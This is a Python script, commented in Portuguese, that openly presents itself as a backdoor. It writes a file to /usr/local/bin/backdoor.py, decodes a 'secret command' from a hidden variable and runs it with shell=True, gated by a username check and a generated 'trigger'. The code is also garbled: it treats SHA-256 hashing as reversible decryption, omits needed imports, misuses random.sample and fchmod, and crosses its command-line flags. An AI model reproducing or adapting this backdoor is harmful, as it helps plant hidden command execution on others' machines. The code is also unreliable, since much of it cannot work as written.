import hashlib
import os
import sys
import argparse
import getpass
import subprocess

# Configuração da backdoor
PORT_ESCONDIDO = 65534
CHAVE_AES256 = "SEU_CHAVE_AQUI_256_BYTES"  # Substitua pela chave de 256 bytes

# Variável oculta no arquivo de configuração
VAR_OCULTA = "comando_secreto_sha256"

def gerar_texto_aleatorio():
    return ''.join(random.choice(string.ascii_letters) for _ in range(10))

def criptografar_plataforma(plataforma, comando):
    texto_aleatorio = gerar_texto_aleatorio()
    
    string_a_criptografar = f"{texto_aleatorio}:{plataforma}:{comando}"
    codificacao = hashlib.sha256(string_a_criptografar.encode()).hexdigest()
    return codificacao

def descriptografar_plataforma(codificacao):
    string_descriptografada = hashlib.sha256(codificacao.encode()).hexdigest()
    texto_aleatorio, plataforma, comando = string_descriptografada.split(":")
    
    # Verifique a integridade do texto_aleatorio para garantir que a codificação foi realizada pelo próprio script
    return plataforma, comando

def ativar_backdoor():
    # Verifique se o script está sendo executado pelo usuário correto
    if getpass.getuser() != "usuário_correto":
        print("Você não tem permissão para executar este script.")
        sys.exit(1)

    plataforma, comando = descriptografar_plataforma(VAR_OCULTA)
    if plataforma != "linux":
        print(f"Plataforma desconhecida: {plataforma}")
        sys.exit(1)

    print(f"Executando comando secreto: {comando}")
    subprocess.call(comando, shell=True)

def criar_backdoor():
    script_destinado = """
    #!/bin/sh
    echo "Backdoor ativada pelo usuário {usuário_correto}" 
    python3 /usr/local/bin/backdoor.py
    """
    
    with open("/usr/local/bin/backdoor.py", "w") as backdoor_file:
        backdoor_file.write(script_destinado)
    os.fchmod(backdoor_file.fileno(), 0o755)

    print("Backdoor criada com sucesso!")
    sys.exit(0)

def adicionar_trigger():
    def todas_as_letras():
        for letra in string.ascii_letters:
            yield letra

    def todos_os_numeros():
        for numero in range(10):
            yield str(numero)

    def todos_os_simbolos():
        yield "-"
        yield "_"
        yield "/"
        yield "*"
        yield "."

    def gerar_combinacao_aleatoria():
        numeros = random.sample(todos_os_numeros(), 4)
        letras = random.sample(todas_as_letras(), 8)
        yield from letras
        yield from numeros

    def fazer_trigger():
        caracteres = gerar_combinacao_aleatoria()
        sequencia = "".join(caracteres)
        return sequencia

    trigger = fazer_trigger()
    print(f"O 'Trigger' oculto é: {trigger}")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--adicionar", help="Adicionar backdoor", action="store_true")
    parser.add_argument("-t", "--trigger", help="Adicionar 'Trigger' oculto", action="store_true")
    args = parser.parse_args()

    if args.adicionar:
        adicionar_trigger()
    elif args.trigger:
        ativar_backdoor()
    else:
        criar_backdoor()

if __name__ == "__main__":
    main()
